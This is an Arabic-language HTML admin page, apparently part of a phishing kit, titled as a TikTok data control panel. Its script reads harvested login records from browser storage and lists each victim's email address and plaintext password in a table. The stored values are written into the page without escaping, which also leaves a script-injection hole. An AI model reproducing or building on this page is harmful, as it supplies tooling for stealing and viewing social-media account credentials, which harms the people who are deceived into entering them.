<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>لوحة التحكم - بيانات تيك توك</title>
    <link rel="stylesheet" href="style.css" />
    <style>
        .admin-container {
            max-width: 900px;
            margin: 40px auto;
            padding: 20px;
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        table th, table td {
            padding: 12px 15px;
            border: 1px solid #ddd;
            text-align: center;
        }

        table th {
            background: #1a1a2e;
            color: #fff;
        }

        .btn-back {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 30px;
            background: #1a1a2e;
            color: #fff;
            border-radius: 30px;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="admin-container">
        <h2>👑 بيانات تسجيل الدخول</h2>
        <div id="usersTable"></div>
        <a href="index.html" class="btn-back">🔙 العودة</a>
    </div>

    <script>
        function loadUsers() {
            const users = JSON.parse(localStorage.getItem('tiktokUsers')) || [];
            const container = document.getElementById('usersTable');

            if (users.length === 0) {
                container.innerHTML = '<p>❌ لا توجد بيانات حتى الآن.</p>';
                return;
            }

            let html = `
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>البريد الإلكتروني</th>
                            <th>كلمة السر</th>
                            <th>التاريخ</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            users.forEach((user, index) => {
                html += `
                    <tr>
                        <td>${index + 1}</td>
                        <td><strong>${user.email}</strong></td>
                        <td>${user.password}</td>
                        <td>${user.date}</td>
                    </tr>
                `;
            });

            html += '</tbody></table>';
            container.innerHTML = html;
        }

        window.onload = loadUsers;
    </script>
</body>
</html>
